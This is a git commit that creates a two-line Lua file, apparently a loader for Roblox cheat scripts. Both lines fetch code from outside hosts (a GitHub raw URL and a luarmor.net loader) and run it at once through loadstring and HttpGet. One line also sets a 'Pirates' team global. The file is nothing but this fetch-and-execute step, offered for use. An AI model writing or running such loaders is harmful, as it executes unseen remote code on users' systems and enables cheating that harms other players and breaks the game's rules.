dec2024c1562530d2315d9b43a321040793c7606
Xuflus <samazinha98@gmail.com>
2024-11-10 09:01:00 -0300

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Anniecuti/Free-Scr/main/Annie-Hub.lua"))() getgenv().Team = "Pirates"
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
